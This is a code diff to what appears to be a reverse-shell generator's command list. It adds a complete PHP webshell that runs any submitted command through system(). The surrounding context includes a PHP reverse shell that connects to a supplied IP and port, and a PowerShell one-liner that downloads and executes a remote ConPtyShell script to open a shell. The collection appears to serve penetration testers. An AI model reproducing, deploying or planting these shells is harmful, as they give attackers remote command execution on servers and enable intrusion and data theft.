@@ -170,6 +170,11 @@ const reverseShellCommands = withCommandType(
             "command": "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
             "meta": ["linux", "windows", "mac"]
         },
+	{
+            "name": "PHP webshell",
+            "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<textarea name=\"cmd2\" id=\"cmd2\" style=\"display:none\"></textarea>\n<input type=\"SUBMIT\" value=\"Execute\">\n<\/form>\n<span id="history">\n	<?php\n		if(isset($_POST[\'cmd2\']))\n		{\n			echo $_POST[\'cmd2\'];\n		}\n	?>\n</span>\n<span id="consola">\n	<?php\n		if(isset($_POST[\'cmd\']))\n		{\n			echo \"<pre><span style=\'color:#00FF00;\'>┌──(</span><span style=\'color:#00ABFF;\'>\".exec(\'whoami').\"@\".exec(\'hostname\').\"</span><span style=\'color:#00FF00;\'>)-[</span>\".exec(\'pwd\').\"<span style=\'color:#00FF00;\'>]</span>\";\n			echo \"<br>\";\n			echo \"<span style=\'color:#00FF00;\'>└─</span><span style=\'color:#00ABFF;\'>$</span> \".$_POST[\'cmd\'];\n			echo \"<br>\";\n			system($_POST[\'cmd\']);\n			echo \"</pre>\";\n		}\n	?>\n</span>\n</body>\n<script>\ndocument.getElementById("cmd").focus();\ndocument.getElementById(\"cmd2\").value = document.getElementById(\"history\").innerHTML + document.getElementById(\"consola\").innerHTML;\n</script>\n</html>",
+            "meta": ["linux", "windows", "mac"]
+        },
         {
             "name": "Windows ConPty",
             "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
